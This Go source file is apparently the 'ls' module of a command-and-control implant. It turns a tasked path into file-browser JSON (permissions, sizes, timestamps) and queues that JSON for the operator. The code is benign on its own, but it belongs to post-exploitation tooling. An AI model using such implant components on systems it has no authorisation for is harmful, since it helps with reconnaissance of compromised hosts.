package ls

import (
	"encoding/json"
	"io/ioutil"
    "path/filepath"
	"pkg/utils/structs"
	"sync"
	"os"
	"strings"
	"pkg/profiles"
)

var mu sync.Mutex

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	if len(task.Params) == 0 {
		task.Params = "."
	}
	var e structs.DirectoryEntries
	abspath, _ := filepath.Abs(task.Params)
	dirInfo, err := os.Stat(abspath)
    if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
	e.IsFile = !dirInfo.IsDir()
	e.Permissions.Permissions = dirInfo.Mode().Perm().String()
	e.Filename = dirInfo.Name()
	e.ParentPath = filepath.Dir(abspath)
	if strings.Compare(e.ParentPath, e.Filename) == 0{
	    e.ParentPath = ""
	}
	e.FileSize = dirInfo.Size()
    e.LastModified = dirInfo.ModTime().String()
    e.LastAccess = ""
    e.Success = true
    if dirInfo.IsDir(){
        files, err := ioutil.ReadDir(abspath)
        if err != nil {
            msg.UserOutput = err.Error()
            msg.Completed = true
            msg.Status = "error"
            e.Success = false
            msg.FileBrowser = e
            resp, _ := json.Marshal(msg)
            mu.Lock()
            profiles.TaskResponses = append(profiles.TaskResponses, resp)
            mu.Unlock()
            return
        }

        fileEntries := make([]structs.FileData, len(files))
        for i := 0; i < len(files); i++ {
            fileEntries[i].IsFile = !files[i].IsDir()
            fileEntries[i].Permissions.Permissions = files[i].Mode().Perm().String()
            fileEntries[i].Filename = files[i].Name()
            fileEntries[i].FileSize = files[i].Size()
            fileEntries[i].LastModified = files[i].ModTime().String()
            fileEntries[i].LastAccess = ""
        }
        e.Files = fileEntries
    }
    msg.Completed = true
    msg.FileBrowser = e
	msg.UserOutput = "Retrieved data for file browser"
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
